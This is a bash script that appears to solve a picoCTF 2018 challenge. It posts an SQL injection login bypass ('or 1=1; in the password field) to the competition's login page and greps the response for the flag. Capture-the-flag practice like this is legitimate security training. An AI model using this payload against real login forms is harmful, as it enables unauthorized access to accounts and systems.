#!/bin/bash

wget -q --post-data="username=admin&password=%27or+1%3D1%3B&debug=0" http://2018shell.picoctf.com:22430/login.php
grep -oE "picoCTF{.*}" login.php
